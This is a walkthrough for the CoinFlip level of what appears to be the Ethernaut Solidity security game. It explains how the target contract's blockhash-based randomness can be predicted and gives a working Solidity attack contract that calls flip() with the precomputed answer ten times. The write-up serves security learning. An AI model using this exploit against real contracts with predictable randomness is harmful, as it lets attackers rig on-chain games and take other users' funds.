# 3. CoinFlip
*Please see contracts/3_CoinFlip.sol & contracts/3_CoinFlipAttack.sol*

Open up the developer console.
Open up Remix and deploy the CoinFlip contract at the address specified in the developer console.

___
## 1. Initial Considerations & Methodology

The idea in this level is to correctly guess the correct result of the coin flipping game 10 times in a row.  
We need to pass in the correct guess to ```flip()``` , so therefore we need to already know what the result of the coin toss will be before actually calling ```flip()``.  

This requires us to use Remix as we will need to create a new contract that will be used to attack the CoinFlip contract.  

___
## 2. How To Complete

1. Understand how the "randomness" of the coin toss is generated.
2. Recreate this call using a function in the attack contract. 
3. In the same function as the above call ```flip()``` and pass in the value that has already been calculated.

___
### 1. Understand how the "randomness" of the coin toss is generated

This contract does not have authentic randomness and therefore we can attack this part and replicate it.  
```
uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
```
The above is the part of the ```flip()``` function that calculates the coin flip outcome. 

This line of the code gets the last blockhash. The reason we are getting the hash of the last block and not the lastest (as can be seen in ```block.number.sub(1)``` ) is that the current blockhash is not known until the block has been mined.
```
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
```

This block of code checks to see if the new blockhash is the same as lastHash. This stops the function being called mutliple times in the same block. 
```
if (lastHash == blockValue) {
            revert();
        }
```
This assigns the blockhash to ```lastHash``` so that it can be used to check for multiple calls in the same block.
```
lastHash = blockValue;
```

This line divides the blockhash by a hardcoded ```FACTOR```.
```
// HARDCODED FACTOR 
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

uint256 coinFlip = blockValue.div(FACTOR);
```

The last line of this code block checks to see the result of ```coinFlip``` and whether the result is equal to 1 or not. 
```
bool side = coinFlip == 1 ? true : false;
```

**Now we understand how the outcome is calculated, we can exploit the contract**
___
### 2. Recreate this call using a function in the attack contract
Create a new contract that imports the delopyed CoinFlip.sol contract.  
Copy over the same ```FACTOR``` variable.
Pass in the address of the CoinFlip contract into the constructor.
```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./3_CoinFlip.sol";

contract CoinFlipAttack {
    CoinFlip public victimContract;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victimContractAddr) {
        victimContract = CoinFlip(_victimContractAddr);
    }
}
```

Now we can create a function in out attack contract to replicate the flip outcome.
```
function flip() public returns (bool) {
  uint256 blockValue = uint256(blockhash(block.number - 1));
  uint256 coinFlip = uint256(blockValue / FACTOR);
  bool side = coinFlip == 1 ? true : false;

}
```
___
### 3. Call ```flip()``` and pass in the value that has already been calculated  
Add the following to the function to then call CoinFlip.sol ```flip()``` and pass in the pre-calculated outcome.
```
victimContract.flip(side);
```
Then call CoinFlipAttack ```flip()``` 10 times.

**YOU CAN NOW SUBMIT THE ANSWER AND HAVE NOW COMPLETED THIS LEVEL**
